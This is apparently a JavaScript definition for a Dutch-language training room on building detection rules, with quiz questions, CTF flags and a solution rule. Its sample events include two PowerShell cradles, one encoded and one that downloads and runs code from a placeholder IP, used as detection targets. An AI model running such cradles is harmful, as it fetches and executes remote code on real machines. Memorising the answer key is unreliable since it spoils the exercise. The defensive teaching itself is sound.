/* Room: Defensief — detectie bouwen: van IOC naar regel (hands-on) */

// =======================================================================
//  Alles FICTIEF: verzonnen Sysmon-achtige events en IP's (RFC 5737).
//  Je bouwt en tunet zelf een detectieregel.
// =======================================================================

const DB_EVENTS = [
  { label: 'powershell -w hidden -enc (encoded cradle)', malicious: true, fields: { EventID: '1', Image: 'powershell.exe', CommandLine: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi' } },
  { label: 'powershell -w hidden DownloadString', malicious: true, fields: { EventID: '1', Image: 'powershell.exe', CommandLine: 'powershell.exe -w hidden IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.9/a")' } },
  { label: 'powershell Get-Service (normaal)', malicious: false, fields: { EventID: '1', Image: 'powershell.exe', CommandLine: 'powershell.exe Get-Service' } },
  { label: 'chrome renderer (normaal)', malicious: false, fields: { EventID: '1', Image: 'chrome.exe', CommandLine: 'chrome.exe --type=renderer' } },
  { label: 'Get-ChildItem -Hidden (legitiem!)', malicious: false, fields: { EventID: '1', Image: 'powershell.exe', CommandLine: 'powershell.exe Get-ChildItem -Hidden C:\\Users\\jan' } },
  { label: 'cmd dir (normaal)', malicious: false, fields: { EventID: '4688', Image: 'cmd.exe', CommandLine: 'cmd.exe /c dir' } },
];

CS.registerRoom({
  id: 'detectie-bouwen',
  path: 'defensief',
  order: 6,
  title: 'Detectie bouwen: van IOC naar regel',
  icon: '🧰',
  difficulty: 'Gemiddeld',
  minutes: 45,
  summary: 'De praktijkkant van detectie-engineering. Je bouwt zelf een detectieregel uit voorwaarden en test hem live tegen een set events — en leert de kerndilemma\'s voelen: een te brede regel geeft vals-positieven (ruis, alarmmoeheid), een te smalle mist de aanval. Je tunet een naïeve regel tot hij precies alle kwaadaardige events vangt, zonder ruis.',
  objectives: [
    'De begrippen true/false positive en false negative uitleggen',
    'Een detectieregel bouwen uit voorwaarden (field + operator + waarde)',
    'Het spanningsveld specificiteit (weinig FP) vs. dekking (weinig FN) toepassen',
    'Een te brede regel tunen tot hij geen vals-positieven meer geeft',
    'Waarom je detectie bouwt op gedrag, niet alleen op makkelijk te wisselen IOCs',
  ],
  terms: [
    { term: 'Detectie-engineering', def: 'Het ontwerpen, testen en onderhouden van detectieregels die aanvallen zichtbaar maken in logs.' },
    { term: 'True positive (TP)', def: 'Een terecht alarm: de regel matcht een event dat echt kwaadaardig is.' },
    { term: 'False positive (FP)', def: 'Een vals alarm: de regel matcht iets onschuldigs. Te veel FP → alarmmoeheid.' },
    { term: 'False negative (FN)', def: 'Een gemiste aanval: de regel matcht een kwaadaardig event níét.' },
    { term: 'Specificiteit', def: 'Hoe precies een regel is: hoog = weinig vals-positieven.' },
    { term: 'Dekking', def: 'Hoeveel van de aanvallen een regel vangt: hoog = weinig gemiste events (FN).' },
    { term: 'Alarmmoeheid', def: 'Wanneer analisten door te veel vals alarm échte alarmen gaan negeren.' },
    { term: 'Pyramid of Pain', def: 'Model (David Bianco): detectie op gedrag/TTP\'s doet een aanvaller meer pijn dan detectie op makkelijk te wisselen IOCs (hashes, IP\'s).' },
  ],
  resources: [
    { title: 'SigmaHQ — Sigma-regels en specificatie', url: 'https://github.com/SigmaHQ/sigma' },
    { title: 'MITRE ATT&CK — Command and Scripting Interpreter: PowerShell (T1059.001)', url: 'https://attack.mitre.org/techniques/T1059/001/' },
    { title: 'David Bianco — The Pyramid of Pain', url: 'https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html' },
    { title: 'Microsoft — Sysmon', url: 'https://learn.microsoft.com/sysinternals/downloads/sysmon' },
  ],
  tasks: [
    {
      title: 'Taak 1 — De taal van detectie: TP, FP en FN',
      content: `
        <p>Een detectieregel is een afweging, geen schakelaar. Elke regel verdeelt de wereld in vier vakjes:</p>
        <ul>
          <li><strong>True positive (TP)</strong> — terecht alarm (regel matcht echt kwaadaardig event). 🎯</li>
          <li><strong>False positive (FP)</strong> — vals alarm (regel matcht iets onschuldigs). 🔔 Te veel → <em>alarmmoeheid</em>.</li>
          <li><strong>False negative (FN)</strong> — gemiste aanval (regel matcht een kwaadaardig event niet). 😱</li>
          <li><strong>True negative (TN)</strong> — terecht stil (onschuldig event, geen alarm).</li>
        </ul>
        <p>Het eeuwige dilemma: maak je de regel <strong>breder</strong> (meer dekking, minder FN) dan krijg je meer
        <strong>FP</strong>; maak je hem <strong>smaller</strong> (minder FP) dan riskeer je <strong>FN</strong>. Goede
        detectie vangt álle kwaadaardige events met zo min mogelijk ruis — en bouwt bij voorkeur op <em>gedrag</em>
        (hoog in de <strong>Pyramid of Pain</strong>) in plaats van op een IP of hash die een aanvaller zo wisselt.</p>
        <div class="callout warn"><strong>Alles fictief:</strong> de events en IP's zijn verzonnen oefenmateriaal.</div>
        <div class="callout tip"><strong>Beloning:</strong> alle aanvallen vangen, geen ruis. Vlag: <code>NM{tp_zonder_fp}</code>.</div>
      `,
      questions: [
        { q: 'Wat is een false positive?', options: ['Een vals alarm: de regel matcht iets onschuldigs', 'Een gemiste aanval', 'Een terecht alarm', 'Een uitgeschakelde regel'], answer: 0, explain: 'Een FP is loos alarm; te veel FP leidt tot alarmmoeheid en gemiste echte dreigingen.' },
        { q: 'Wat gebeurt er als je een regel steeds breder maakt?', options: ['Meer dekking, maar ook meer vals-positieven', 'Minder vals-positieven', 'Gegarandeerd nul alarmen', 'De regel stopt met werken'], answer: 0, explain: 'Breder = je vangt meer, inclusief meer onschuldige dingen (FP). Dat is het kerndilemma.' },
        { q: 'Waarom is detectie op gedrag beter dan op een los IP of hash?', options: ['Gedrag/TTP\'s zijn moeilijker te wisselen voor een aanvaller (hoger in de Pyramid of Pain)', 'IP\'s zijn geheim', 'Hashes bestaan niet', 'Gedrag is makkelijker te typen'], answer: 0, explain: 'Een aanvaller wisselt een IP of hash zo; zijn techniek/gedrag veranderen kost veel meer moeite.' },
        { q: 'Welke vlag staat in de tip-callout?', answer: ['NM{tp_zonder_fp}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{tp_zonder_fp}.' },
      ],
    },
    {
      title: 'Taak 2 — Bouw en test je eigen regel',
      content: `
        <p>Tijd om het te voelen. Hieronder staan zes events (🟥 = kwaadaardig, 🟩 = onschuldig). Bouw een regel uit
        voorwaarden (ze worden met <strong>EN</strong> gecombineerd) en test hem live. Je doel: <strong>beide</strong>
        kwaadaardige PowerShell-commando's vangen, met <strong>geen</strong> vals-positieven.</p>
        <p>Tip: begin breed en kijk wat er misgaat. Probeer bijvoorbeeld <code>CommandLine bevat hidden</code> — en let op
        welk onschuldig commando dan óók afgaat. Verfijn daarna.</p>
        <div class="callout tip"><strong>Beloning:</strong> de perfecte regel onthult de vlag in het lab: <code>NM{regel_op_maat}</code>.</div>
      `,
      lab: {
        type: 'detectrule',
        title: 'detecteer de PowerShell-aanval',
        scenario: 'Twee kwaadaardige PowerShell-cradles tussen normaal verkeer. Vang ze beide zonder vals alarm.',
        fields: ['EventID', 'Image', 'CommandLine'],
        events: DB_EVENTS,
        solution: [{ field: 'CommandLine', op: 'bevat', value: '-w hidden' }],
        flag: 'NM{regel_op_maat}',
        ask: [
          { q: 'Hoeveel kwaadaardige events staan er in totaal in de lijst?', answer: ['2', 'twee'], hint: 'Tel de 🟥-events.' },
          { q: 'Welke voorwaarde-waarde vangt beide zonder vals-positief (vul precies in)?', answer: ['-w hidden', 'w hidden'], hint: 'Niet alleen "hidden" — dat matcht ook het legitieme Get-ChildItem -Hidden.' },
        ],
      },
      questions: [
        { q: 'Waarom geeft de regel "CommandLine bevat hidden" een vals-positief?', options: ['Omdat het legitieme "Get-ChildItem -Hidden" ook "hidden" bevat', 'Omdat hidden een virus is', 'Omdat PowerShell verboden is', 'Omdat het event ontbreekt'], answer: 0, explain: 'Een onschuldig commando met "-Hidden" matcht ook; de regel is te breed.' },
        { q: 'Hoe maak je de regel specifiek genoeg?', options: ['Match op "-w hidden" (met de -w ervoor), zodat alleen de cradles afgaan', 'Match op "powershell"', 'Match op EventID 1', 'Verwijder alle voorwaarden'], answer: 0, explain: '"-w hidden" (de verborgen-venster-vlag) zit wel in de aanvallen maar niet in het legitieme Get-ChildItem -Hidden.' },
        { q: 'Hoeveel kwaadaardige events moet je vangen voor een perfecte score?', answer: ['2', 'twee'], hint: 'Het aantal 🟥-events.', explain: 'Beide kwaadaardige cradles (TP = 2) met FP = 0 is de perfecte regel.' },
        { q: 'Welke vlag hoort bij de perfecte regel?', answer: ['NM{regel_op_maat}'], hint: 'Verschijnt in het lab bij TP=2, FP=0 / staat in de tip-callout.', explain: 'De vlag is NM{regel_op_maat}.' },
      ],
    },
    {
      title: 'Taak 3 — Tunen, testen en documenteren',
      content: `
        <p>Een regel is nooit "af". Voordat hij live gaat, test je hem tegen <strong>echte</strong> (goede én kwaadaardige)
        data om de FP-last te meten. Daarna <strong>tune</strong> je: uitzonderingen voor bekende legitieme tools,
        drempelwaarden, en context. En je <strong>documenteert</strong>: welke ATT&CK-techniek dekt de regel, welke
        aannames, en wat te doen bij een hit (de "response").</p>
        <p>De regel die je net bouwde dekt <strong>T1059.001 (PowerShell)</strong>. In Sigma zou je dezelfde logica
        schrijven als een <code>selection</code> op <code>CommandLine|contains: '-w hidden'</code> — porteerbaar naar elke
        SIEM.</p>
        <div class="callout tip"><strong>Beloning:</strong> test vóór je deployt. Vlag: <code>NM{test_voor_je_deployt}</code>.</div>
      `,
      questions: [
        { q: 'Waarom test je een regel tegen echte data voordat hij live gaat?', options: ['Om de vals-positief-last te meten en alarmmoeheid te voorkomen', 'Om de regel sneller te maken', 'Omdat het wettelijk moet', 'Om de SIEM te resetten'], answer: 0, explain: 'Een regel die in productie honderden FP\'s geeft, wordt genegeerd of uitgezet — eerst meten, dan tunen.' },
        { q: 'Welke ATT&CK-techniek dekt de PowerShell-regel uit taak 2?', options: ['T1059.001 — Command and Scripting Interpreter: PowerShell', 'T1566 — Phishing', 'T1486 — Data Encrypted for Impact', 'T1110 — Brute Force'], answer: 0, explain: 'Kwaadaardige PowerShell-uitvoering valt onder T1059.001; je documenteert die dekking bij de regel.' },
        { q: 'Wat hoort nog meer bij een goede regel, naast de match-logica?', options: ['Documentatie: dekking (ATT&CK), aannames en wat te doen bij een hit', 'Alleen de titel', 'Een wachtwoord', 'Niets'], answer: 0, explain: 'Een regel zonder response-instructie en context laat de analist in het ongewisse; documenteer het.' },
        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{test_voor_je_deployt}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{test_voor_je_deployt}.' },
      ],
    },
  ],
});
